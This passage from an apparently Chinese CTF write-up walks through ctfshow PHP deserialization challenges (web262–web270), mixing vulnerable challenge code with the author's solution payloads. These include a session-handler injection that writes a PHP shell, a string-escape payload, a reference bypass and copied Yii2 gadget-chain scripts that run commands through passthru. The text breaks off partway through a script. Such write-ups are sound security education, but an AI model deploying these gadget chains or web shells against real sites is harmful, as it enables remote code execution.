class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;get(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span></span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//登陆成功取消次数累计</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//登陆失败累计次数加1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php代码如下！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag_here&quot;</span>;</span><br></pre></td></tr></table></figure><p>index.php代码如下！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看inc.php，其中ini_set(‘session.serialize_handler’, ‘php’);表明使用的是php引擎，5.5.4前默认是php；5.5.4后改为php_serialize！</p><blockquote><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br><br>php: 键名+竖线（|）+经过serialize()函数处理过的值<br><br>php_serialize: 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</p></blockquote><p>file_put_contents() 函数把一个字符串写入文件中。<br><img src="https://img-blog.csdnimg.cn/20210417170902429.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ussername</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$status</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;b.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;&lt;?php system(&quot;cat f*&quot;);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>其实这里也是可以写入一句话木马，然后蚁剑链接！<br><img src="https://img-blog.csdnimg.cn/20210417173137523.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来张蚁剑图片！<br><img src="https://img-blog.csdnimg.cn/20210417173334521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="264-反序列化字符串逃逸"><a href="#264-反序列化字符串逃逸" class="headerlink" title="264(反序列化字符串逃逸)"></a>264(反序列化字符串逃逸)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里与web262相似，这里构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="number">1</span>&amp;m=<span class="number">1</span>&amp;t=<span class="number">1</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>token%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>admin%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后cookie msg=1 ,访问message.php就行了！<br><img src="https://img-blog.csdnimg.cn/20210417222053529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后去访问它！<br><img src="https://img-blog.csdnimg.cn/20210417222208576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web265-反序列化中指针引用：-amp"><a href="#web265-反序列化中指针引用：-amp" class="headerlink" title="web265(反序列化中指针引用：&amp;)"></a>web265(反序列化中指针引用：&amp;)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用到类似C语言里面的指针！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">这时a的值便是<span class="number">1</span>，其实这里<span class="variable">$B</span>与<span class="variable">$a</span>都时一个变量，只不过有许多名字！</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowAdmin</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;password=&amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowAdmin;</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ctfshow&#x3D;O:12:&quot;ctfShowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><hr /><h1 id="web266-PHP对类名的大小写不敏感"><a href="#web266-PHP对类名的大小写不敏感" class="headerlink" title="web266(PHP对类名的大小写不敏感)"></a>web266(PHP对类名的大小写不敏感)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们序列化的字符串里面如果有ctfshow就会抛出一个异常，这样就没法触发__destrurt魔术方法了,所以得绕过这个正则.且__destruct()在结束时自动启用！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshow());</span><br></pre></td></tr></table></figure><p>然后将生成的ctfshow改一下大写！<br><img src="https://img-blog.csdnimg.cn/20210417224323228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web267-web270-Yii反序列化漏洞"><a href="#web267-web270-Yii反序列化漏洞" class="headerlink" title="web267~web270(Yii反序列化漏洞)"></a>web267~web270(Yii反序列化漏洞)</h1><p>网页是个CTFshow社区，瞎点点，然后我一眼就看到了login登录界面！然后使用admin和admin进行登录！并在about页面的源代码里面发现注释?view-source这个提示！访问url+?r=site/about&amp;view-source得到个反序列化点！</p><blockquote><p>Yii是一套基于组件、用于开发大型Web应用的高性能PHP框架。Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210417225244884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问/index.php?r=backdoor/shell&amp;code=poc即可执行命令<br>抄个脚本！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?r&#x3D;backdoor&#x2F;shell&amp;code&#x3D;</span><br><span class="line">后面加上我们脚本生成的字符！</span><br></pre></td></tr></table></figure><p>下面这个是又补充了一个脚本！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span 